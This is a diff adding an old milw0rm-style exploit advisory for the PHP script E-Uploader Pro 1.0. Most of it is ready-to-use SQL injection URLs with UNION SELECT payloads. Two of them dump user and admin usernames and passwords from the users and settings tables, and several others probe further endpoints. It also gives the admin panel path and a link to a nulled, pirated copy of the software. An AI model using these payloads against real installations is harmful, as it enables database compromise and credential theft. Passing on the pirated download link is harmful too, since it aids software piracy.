@@ -1,0 +1,33 @@
+E-Uploader Pro <= 1.0 SQL Injection Vulnerability
+
+Author: ~!Dok_tOR!~
+Date found: 26.08.08
+Product: E-Uploader Pro
+Version: 1.0
+Price: $49
+URL: www.scriptsfrenzy.com
+Download script: http://rapidshare.com/files/18285945/E-UploaderPro.PHP.NULL-DGT_license.zip
+Vulnerability Class: SQL Injection
+Condition: magic_quotes_gpc = Off
+
+Exploit 1:
+
+http://localhost/[installdir]/browser.php?view='+union+select+1,concat_ws(0x3a,user,pass),3,4,5,6,7+from+users/*
+
+Exploit 2:
+
+http://localhost/[installdir]/browser.php?view='+union+select+1,concat_ws(0x3a,admin_user,admin_pass),3,4,5,6,7+from+settings/*
+
+Adminka:
+
+http://localhost/[installdir]/admin.php
+
+
+http://localhost/[installdir]/img.php?id='+union+select+1,2,user()/*
+http://localhost/[installdir]/file.php?id='+union+select+1,2,3/*
+http://localhost/[installdir]/mail.php?id='+union+select+1,2,3/*
+http://localhost/[installdir]/thumb.php?id='+union+select+1,2,user()/*
+http://localhost/[installdir]/zip.php?id='+union+select+1,2,3/*
+http://localhost/[installdir]/zipit.php?id='+union+select+1,2,3,4,5,6,7/*
+
+# milw0rm.com [2008-09-27]
